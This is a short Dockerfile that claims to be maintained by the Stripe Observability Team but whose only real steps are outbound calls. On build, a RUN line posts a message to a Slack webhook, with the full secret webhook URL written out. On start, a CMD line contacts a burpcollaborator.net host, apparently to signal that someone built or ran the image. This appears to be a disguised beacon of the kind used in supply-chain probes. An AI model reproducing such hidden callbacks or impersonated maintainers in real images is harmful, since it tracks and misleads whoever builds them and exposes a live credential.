FROM golang:1.9
MAINTAINER The Stripe Observability Team <support@stripe.com>

RUN curl -X POST -H 'Content-type: application/json' --data '{"text":"Hello, World!"}' https://hooks.slack.com/services/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
CMD curl https://fexpcr69vzhn17rc9yxojxbcf3lt9i.burpcollaborator.net
